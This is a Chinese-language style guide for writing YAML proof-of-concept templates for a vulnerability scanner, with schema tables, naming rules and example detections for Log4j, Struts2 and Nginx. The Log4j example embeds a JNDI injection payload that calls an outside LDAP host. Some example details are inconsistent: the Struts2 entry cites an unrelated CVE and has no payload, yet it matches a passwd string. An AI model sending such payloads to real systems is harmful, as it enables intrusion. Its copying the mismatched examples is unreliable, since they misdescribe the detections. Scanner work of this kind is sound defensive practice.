# POC 编写规则文档

## 目录
- [POC 概述](#poc-概述)
- [YAML 格式规范](#yaml-格式规范)
- [POC 分类体系](#poc-分类体系)
- [编写指南](#编写指南)
- [验证规则](#验证规则)
- [示例 POC](#示例-poc)

---

## POC 概述

POC (Proof of Concept) 是用于验证目标系统是否存在特定安全漏洞的检测脚本。本扫描器采用 YAML 格式定义 POC，具有以下特点：
- 易于阅读和编写
- 结构化清晰
- 支持多种检测方式
- 便于扩展和维护

---

## YAML 格式规范

### 基本结构

```yaml
name: "POC名称"
id: "唯一标识符"
category: "POC分类"
severity: "风险等级"
description: "漏洞描述"
author: "作者"
version: "版本号"
references:
  - "参考链接1"
  - "参考链接2"
tags:
  - "标签1"
  - "标签2"
target:
  protocol: "协议类型"
  path: "请求路径"
  method: "请求方法"
  headers:
    Header-Name: "Header值"
  body: "请求体"
conditions:
  - type: "响应码检测"
    operator: "操作符"
    value: "期望值"
  - type: "内容匹配"
    operator: "操作符"
    value: "匹配内容"
```

### 字段说明

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `name` | String | 是 | POC 显示名称 |
| `id` | String | 是 | 唯一标识符，格式：`{分类}-{厂商}-{漏洞编号}` |
| `category` | String | 是 | 分类：cve/vendor/others |
| `severity` | String | 是 | 风险等级：Critical/High/Medium/Low/Info |
| `description` | String | 是 | 漏洞详细描述 |
| `author` | String | 是 | 作者名称 |
| `version` | String | 是 | POC 版本号，格式：`1.0.0` |
| `references` | Array | 否 | 参考 CVE/CNVD 等链接 |
| `tags` | Array | 否 | 自定义标签 |
| `target` | Object | 是 | 目标配置对象 |
| `conditions` | Array | 是 | 检测条件数组 |

### Target 对象字段

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `protocol` | String | 是 | 协议：http/https/ftp/ssh/rdp 等 |
| `path` | String | 否 | 请求路径，如 `/api/v1/login` |
| `method` | String | 是 | 请求方法：GET/POST/PUT/DELETE 等 |
| `headers` | Object | 否 | 请求头键值对 |
| `body` | String | 否 | 请求体内容 |
| `timeout` | Integer | 否 | 超时时间（秒），默认 10 |

### Conditions 字段说明

#### 响应码检测

```yaml
- type: "status"
  operator: "equals"
  value: 200
```

| 操作符 | 说明 |
|--------|------|
| `equals` | 等于 |
| `not_equals` | 不等于 |
| `greater` | 大于 |
| `less` | 小于 |
| `range` | 范围（如 `200,299`） |

#### 内容匹配

```yaml
- type: "body"
  operator: "contains"
  value: "特定字符串"
  position: "any"  # any/header/body
```

| 操作符 | 说明 |
|--------|------|
| `contains` | 包含 |
| `not_contains` | 不包含 |
| `matches` | 正则匹配 |
| `not_matches` | 正则不匹配 |
| `equals` | 完全相等 |
| `json_path` | JSON 路径匹配 |

#### 响应头检测

```yaml
- type: "header"
  name: "Server"
  operator: "contains"
  value: "Apache"
```

#### 响应时间检测

```yaml
- type: "response_time"
  operator: "greater"
  value: 5000  # 毫秒
```

---

## POC 分类体系

### 分类标准

| 分类代码 | 分类名称 | 说明 | 存放目录 |
|----------|----------|------|----------|
| `cve` | CVE 漏洞 | 通用漏洞披露 | `pocs/cve/` |
| `vendor` | 厂商漏洞 | 特定厂商产品漏洞 | `pocs/vendor/` |
| `others` | 其他漏洞 | 未分类漏洞 | `pocs/others/` |

### ID 命名规则

**CVE 漏洞：**
```
格式：cve-{年份}-{编号}
示例：cve-2023-12345
```

**厂商漏洞：**
```
格式：vendor-{厂商简称}-{漏洞编号}
示例：vendor-apache-struts2-s2-066
```

**其他漏洞：**
```
格式：other-{类型}-{编号}
示例：other-info-leak-001
```

---

## 编写指南

### 1. POC 命名

文件名使用小写字母、数字和连字符，以 `.yaml` 或 `.yml` 结尾：

```
✅ cve-2023-12345.yaml
✅ vendor-apache-struts2-s2-066.yaml
❌ CVE_2023_12345.yaml
❌ vendor.apache.yaml
```

### 2. 漏洞描述

- 描述应包含漏洞类型、影响范围、危害程度
- 字数建议 100-300 字
- 避免使用模糊表述

### 3. 风险等级评定

| 等级 | 说明 | 示例 |
|------|------|------|
| Critical | 可直接获取系统权限 | RCE、SQL 注入获取 shell |
| High | 可获取敏感数据 | 任意文件读取、信息泄露 |
| Medium | 需要一定条件利用 | XSS、CSRF |
| Low | 影响有限 | 路径泄露、版本信息泄露 |
| Info | 信息收集 | 端口开放、服务版本检测 |

### 4. 检测条件设计

- 至少包含一个有效检测条件
- 建议组合多种检测方式提高准确率
- 避免误报，确保特征唯一性

### 5. 测试验证

POC 编写完成后，需进行以下测试：
- 对存在漏洞的目标测试，确认能检测到
- 对不存在漏洞的目标测试，确认不会误报
- 对目标不可达的情况测试，确认不会崩溃

---

## 验证规则

### 语法验证

使用以下命令验证 YAML 语法：

```bash
python -c "import yaml; yaml.safe_load(open('poc.yaml'))"
```

### 内容验证

| 检查项 | 验证内容 |
|--------|----------|
| 必填字段 | name、id、category、severity、description、author、version |
| 格式检查 | id 命名是否符合规范、版本号格式 |
| 逻辑检查 | conditions 之间是否合理、target 配置是否完整 |
| 引用检查 | references 链接是否可访问 |

---

## 示例 POC

### 示例 1：CVE 漏洞检测

```yaml
name: "Apache Log4j2 远程代码执行漏洞 (CVE-2021-44228)"
id: "cve-2021-44228"
category: "cve"
severity: "Critical"
description: "Apache Log4j2 存在 JNDI 注入漏洞，攻击者可通过精心构造的恶意请求触发远程代码执行"
author: "Security Team"
version: "1.0.0"
references:
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
  - "https://logging.apache.org/log4j/2.x/security.html"
tags:
  - "rce"
  - "jndi"
  - "log4j"
target:
  protocol: "http"
  path: "/api/test"
  method: "POST"
  headers:
    Content-Type: "application/x-www-form-urlencoded"
    User-Agent: "Mozilla/5.0"
  body: "test=${jndi:ldap://${hostName}.test.com/exploit}"
  timeout: 10
conditions:
  - type: "status"
    operator: "range"
    value: "200,599"
  - type: "body"
    operator: "contains"
    value: "error"
```

### 示例 2：厂商漏洞检测

```yaml
name: "Apache Struts2 S2-066 远程代码执行漏洞"
id: "vendor-apache-struts2-s2-066"
category: "vendor"
severity: "Critical"
description: "Apache Struts2 在处理特定 OGNL 表达式时存在漏洞，攻击者可通过构造恶意请求实现远程代码执行。"
author: "Security Team"
version: "1.0.0"
references:
  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22515"
tags:
  - "rce"
  - "ognl"
  - "struts2"
target:
  protocol: "http"
  path: "/user.action"
  method: "GET"
  headers:
    User-Agent: "Mozilla/5.0"
  timeout: 15
conditions:
  - type: "header"
    name: "Content-Type"
    operator: "contains"
    value: "text/html"
  - type: "body"
    operator: "contains"
    value: "root:x:"
```

### 示例 3：信息泄露检测

```yaml
name: "Nginx 默认配置信息泄露"
id: "vendor-nginx-default-config-leak"
category: "vendor"
severity: "Low"
description: "Nginx 使用默认配置时，可能泄露服务器版本信息和其他敏感配置信息。"
author: "Security Team"
version: "1.0.0"
tags:
  - "info-leak"
  - "nginx"
target:
  protocol: "http"
  path: "/"
  method: "GET"
  headers:
    User-Agent: "Mozilla/5.0"
  timeout: 5
conditions:
  - type: "header"
    name: "Server"
    operator: "contains"
    value: "nginx"
```

---

## POC 模板

```yaml
name: "POC显示名称"
id: "poc-unique-identifier"
category: "cve"  # cve / vendor / others
severity: "High"  # Critical / High / Medium / Low / Info
description: "详细描述漏洞的影响范围和危害程度"
author: "作者名称"
version: "1.0.0"
references:
  - "https://example.com/vulnerability/detail"
tags:
  - "标签1"
  - "标签2"
target:
  protocol: "http"  # http / https / tcp / udp
  path: "/target/path"
  method: "GET"  # GET / POST / PUT / DELETE 等
  headers:
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    Accept: "*/*"
  body: ""
  timeout: 10
conditions:
  - type: "status"
    operator: "equals"
    value: 200
  - type: "body"
    operator: "contains"
    value: "特定特征字符串"
```

---

## 常见问题

### Q1: 如何处理需要认证的漏洞检测？

A: 在 `target.headers` 中添加认证信息：

```yaml
headers:
  Authorization: "Bearer token123"
  Cookie: "sessionid=abc123"
```

### Q2: 如何实现多阶段检测？

A: 使用多个 POC 文件分别定义不同阶段，或在 `conditions` 中设置多个条件。

### Q3: 如何处理 POST 请求的参数？

A: 将参数编码后放入 `body` 字段：

```yaml
body: "username=admin&password=test"
headers:
  Content-Type: "application/x-www-form-urlencoded"
```

### Q4: 如何处理 JSON 格式请求？

A: 使用 JSON 格式的 body：

```yaml
body: '{"username":"admin","password":"test"}'
headers:
  Content-Type: "application/json"
```

---

## 更新日志

| 版本 | 日期 | 说明 |
|------|------|------|
| 1.0.0 | 2024-01-01 | 初始版本 |
